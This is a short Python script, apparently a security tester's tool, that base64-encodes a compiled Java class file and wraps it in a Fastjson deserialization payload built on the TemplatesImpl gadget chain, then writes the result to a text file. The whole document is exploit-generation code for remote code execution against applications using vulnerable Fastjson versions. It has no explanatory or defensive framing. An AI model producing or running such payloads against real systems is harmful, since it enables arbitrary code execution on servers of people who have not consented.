import base64

# 配置你的path
fin = open(r"D:\\Code\\DES\\Fastjson\\target\\classes\\com\\test\\example3\\TEMPOC.class", "rb")
byte = fin.read()
fout = base64.b64encode(byte).decode("utf-8")
poc = '{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",' \
      '"_bytecodes":["%s"],"_name":"a.b","_tfactory":{},"_outputProperties":{ },' \
      '"_version":"1.0","allowedProtocols":"all"}' % fout
fou = open(r"./1.txt","w")
fou.write(poc)
